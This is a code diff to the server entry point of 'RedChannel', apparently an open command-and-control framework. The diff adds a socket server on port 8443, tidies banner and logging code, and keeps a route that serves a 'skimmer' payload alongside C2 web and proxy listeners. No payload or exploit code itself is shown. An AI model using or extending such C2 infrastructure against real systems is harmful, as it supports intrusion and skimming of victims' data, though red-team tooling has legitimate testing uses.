@@ -1,4 +1,3 @@
-import chalk from "chalk";
 import * as dnsd from "dnsd2";
 import { createCommand } from "commander";
 import express from "express";
@@ -6,8 +5,9 @@ import _merge from "lodash.merge";
 
 import RedChannel from "./lib/redchannel";
 import Logger from "./lib/logger";
-import { Config, Constants, Banner, emsg } from "./utils";
+import { Config, Constants, BANNER, emsg } from "./utils";
 import { DefaultConfig, RedChannelConfig } from "./lib/config";
+import SocketServer from "./server/socket";
 
 const log = new Logger();
 
@@ -53,7 +53,7 @@ try {
     process.exit(1);
 }
 
-log.msg(chalk.redBright(Banner));
+log.msg(BANNER);
 
 process.on("uncaughtException", (ex, origin) => {
     log.error(`process error: ${emsg(ex)}, origin: ${origin}`);
@@ -69,6 +69,13 @@ webServer.get(redchannel.config.skimmer.payload_route, redchannel.modules.skimme
 const c2Config = redchannel.config.c2;
 webServer.listen(c2Config.web_port, c2Config.web_ip, () => {
     log.info(`c2-web listening on: ${redchannel.config.c2.web_ip}:${redchannel.config.c2.web_port}`);
+});
+
+const socketServerPort = 8443;
+const socketServerBindHost = "0.0.0.0";
+const socketServer = new SocketServer(redchannel, socketServerPort, socketServerBindHost, log);
+socketServer.start(() => {
+    log.info(`socket server listening on ${socketServer.bindHost}:${socketServer.port}`);
 });
 
 /**
@@ -101,5 +108,5 @@ if (proxyConfig.enabled) {
     log.info(`c2-proxy enabled, checkin at interval: ${proxyConfig.interval}ms`);
     redchannel.modules.proxy.proxyFetchLoop();
 } else {
-    log.info("c2-proxy is disabled, see 'use proxy' -> 'help'");
+    log.info("c2-proxy is disabled");
 }
